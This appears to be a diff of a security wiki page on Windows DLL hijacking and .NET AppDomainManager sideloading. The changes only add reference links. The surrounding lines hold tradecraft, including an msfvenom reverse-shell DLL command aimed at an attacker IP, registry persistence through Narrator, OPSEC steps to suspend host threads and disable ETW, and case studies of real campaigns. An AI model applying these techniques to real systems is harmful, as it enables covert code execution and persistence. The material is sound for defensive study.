@@ -21,9 +21,9 @@ Several methods are employed for DLL hijacking, each with its effectiveness depe
 
 ### AppDomainManager hijacking (`<exe>.config` + attacker assembly)
 
-Classic DLL sideloading is not the only way to make a trusted **.NET Framework** process load attacker code. If the target executable is a **managed** application, the CLR also consults an **application configuration file** named after the executable (for example `Setup.exe.config`). That file can define a custom **AppDomainManager**. If the config points to an attacker-controlled assembly placed next to the EXE, the CLR loads it **before the application's normal code path** and runs inside the trusted process.
+Classic DLL sideloading is not the only way to make a trusted **.NET Framework** process load attacker code. If the target executable is a **managed** application, the CLR also consults an **application configuration file** named after the executable (for example `Setup.exe.config`). That file can define a custom **AppDomainManager**. If the config points to an attacker-controlled assembly placed next to the EXE, the CLR loads it **before the application's normal code path** and runs inside the trusted process.<sup>[[24]](#references)</sup>
 
-Per Microsoft's .NET Framework configuration schema, both `<appDomainManagerAssembly>` and `<appDomainManagerType>` must be present for the custom manager to be used.
+Per Microsoft's .NET Framework configuration schema, both `<appDomainManagerAssembly>` and `<appDomainManagerType>` must be present for the custom manager to be used.<sup>[[16]](#references)[[17]](#references)</sup>
 
 Minimal config:
 
@@ -57,7 +57,7 @@ Practical notes:
 
 ### AppDomainManager as a downloader + scheduled-task bootstrap
 
-A practical intrusion pattern is to pair the trusted managed EXE with both a malicious `*.config` and a malicious AppDomainManager DLL that acts only as a **small bootstrapper**:
+A practical intrusion pattern is to pair the trusted managed EXE with both a malicious `*.config` and a malicious AppDomainManager DLL that acts only as a **small bootstrapper**:<sup>[[25]](#references)</sup>
 
 1. User launches a signed .NET installer or updater from a believable location such as `%USERPROFILE%\Downloads`.
 2. The adjacent config causes the CLR to load the attacker assembly **before** the legitimate app logic starts.
@@ -91,7 +91,7 @@ For persistence, do not only look for **creating a new task**. Some intrusion se
 
 Reusable workflow:
 1. Install/run the legitimate software and identify the task it normally creates.
-2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
+2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.<sup>[[23]](#references)</sup>
 3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
 4. Re-register the same task name instead of creating a new obvious persistence artifact.
 
@@ -164,7 +164,7 @@ There are other ways to alter the ways to alter the search order but I'm not goi
 
 ### Chaining an arbitrary file write into a missing-DLL hijack
 
-1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
+1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.<sup>[[14]](#references)</sup>
 2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
 3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
 4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
@@ -272,14 +272,14 @@ Operational usage example
 - Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
 - Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
 
-This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
+This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.<sup>[[6]](#references)</sup>
 
 
 ### .NET AppDomainManager hijacking via `.exe.config`
 
 For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.
 
-How the chain works:
+How the chain works:<sup>[[15]](#references)[[22]](#references)</sup>
 1. The host EXE starts and the **CLR reads `<exe>.config`**.
 2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
 3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
@@ -306,11 +306,11 @@ Campaign-style pattern (exact nesting can vary by directive / CLR version):
 ```
 
 Why this is useful:
-- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
-- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
-- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
-- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
-- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
+- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.<sup>[[18]](#references)</sup>
+- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.<sup>[[16]](#references)[[17]](#references)</sup>
+- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.<sup>[[19]](#references)</sup>
+- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.<sup>[[20]](#references)</sup>
+- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.<sup>[[21]](#references)</sup>
 - **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.
 
 Operational pattern seen in recent campaigns:
@@ -509,7 +509,7 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
 
 ## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
-Windows Narrator.exe still probes a predictable, language-specific localization DLL on start that can be hijacked for arbitrary code execution and persistence.
+Windows Narrator.exe still probes a predictable, language-specific localization DLL on start that can be hijacked for arbitrary code execution and persistence.<sup>[[7]](#references)</sup>
 
 Key facts
 - Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
@@ -534,7 +534,7 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
 ```
 
 OPSEC silence
-- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.
+- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.<sup>[[8]](#references)</sup>
 
 Trigger and persistence via Accessibility configuration
 - User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
@@ -555,7 +555,7 @@ Notes
 
 ## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
-This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.
+This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ### Vulnerability Details
 
@@ -589,7 +589,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
 
 ## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)
 
-Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.
+Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.<sup>[[10]](#references)</sup>
 
 Chain overview
 - User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
@@ -637,7 +637,7 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
 
 ## Signed triads + encrypted payloads (ShadowPad case study)
 
-Check Point described how Ink Dragon deploys ShadowPad using a **three-file triad** to blend in with legitimate software while keeping the core payload encrypted on disk:
+Check Point described how Ink Dragon deploys ShadowPad using a **three-file triad** to blend in with legitimate software while keeping the core payload encrypted on disk:<sup>[[12]](#references)</sup>
 
 1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). The attackers rename the executable to look like a Windows binary (for example `conhost.exe`), but the Authenticode signature remains valid.
 2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). The DLL is usually an MFC binary obfuscated with the ScatterBrain framework; its only job is to locate the encrypted blob, decrypt it, and reflectively map ShadowPad.
@@ -651,7 +651,7 @@ Tradecraft notes:
 
 ### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)
 
-Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk is the malicious DLL next to the trusted EXE:
+Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk is the malicious DLL next to the trusted EXE:<sup>[[1]](#references)</sup>
 
 - **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:
 
@@ -679,7 +679,7 @@ Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk i
 
 ## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
 
-A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads.
+A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads.<sup>[[13]](#references)</sup>
 
 Tradecraft flow
 - `update.exe` (NSIS) creates `%AppData%\Bluetooth`, marks it **HIDDEN**, drops a renamed Bitdefender Submission Wizard `BluetoothService.exe`, a malicious `log.dll`, and an encrypted blob `BluetoothService`, then launches the EXE.
@@ -707,7 +707,7 @@ C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
 
 ## Signed-host sideloading with export proxying + host thread parking
 
-Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.
+Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.<sup>[[11]](#references)</sup>
 
 Observed pattern
 - Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
